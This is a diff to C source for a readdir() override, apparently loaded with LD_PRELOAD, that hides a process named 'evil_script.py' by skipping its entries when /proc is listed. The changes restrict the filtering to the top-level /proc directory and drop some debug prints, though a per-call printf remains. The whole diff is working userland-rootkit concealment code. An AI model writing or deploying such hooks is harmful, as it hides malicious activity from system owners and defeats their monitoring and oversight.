@@ -7,6 +7,16 @@
 
 typedef struct dirent* (*original_readdir_t)(DIR *dirp);
 
+static int is_proc_dir(DIR *d) {
+    char linkpath[64], target[PATH_MAX];
+    snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", dirfd(d));
+    ssize_t r = readlink(linkpath, target, sizeof(target)-1);
+    if (r <= 0) return 0;
+    target[r] = '\0';
+    /* common procfd names: "/proc", "/proc/" or "/proc/<something>" — accept /proc only */
+    return (strcmp(target, "/proc") == 0);
+}
+
 struct dirent* readdir(DIR *dirp) {
     static original_readdir_t original_readdir;
     static int call_count = 0;
@@ -22,6 +32,11 @@ struct dirent* readdir(DIR *dirp) {
     struct dirent* dir = original_readdir(dirp);
     call_count++;
     printf("readdir called %d times\n", call_count);
+    
+    // Only process entries in the top-level /proc directory
+    if (!is_proc_dir(dirp)) {
+        return dir;
+    }
     
     if (dir == NULL || dir->d_name[0] < '0' || dir->d_name[0] > '9') {
         return dir;
@@ -48,10 +63,6 @@ struct dirent* readdir(DIR *dirp) {
                 char process_name[256] = {0};
                 strncpy(process_name, buffer + start, end - start);
                 
-                printf("Process name: %s\n", process_name);
-                printf("Length of process name: %ld\n", strlen(process_name));
-                printf("Comparing with 'containerd-shim'\n");
-                
                 // Use exact string comparison
                 if (strcmp(process_name, "evil_script.py") == 0) {
                     printf("Found match! Skipping process: %s\n", dir->d_name);
@@ -62,8 +73,7 @@ struct dirent* readdir(DIR *dirp) {
             }
         }
         fclose(fp);
-    }
+    }  
     regfree(&regex);
     return dir;
 }
-
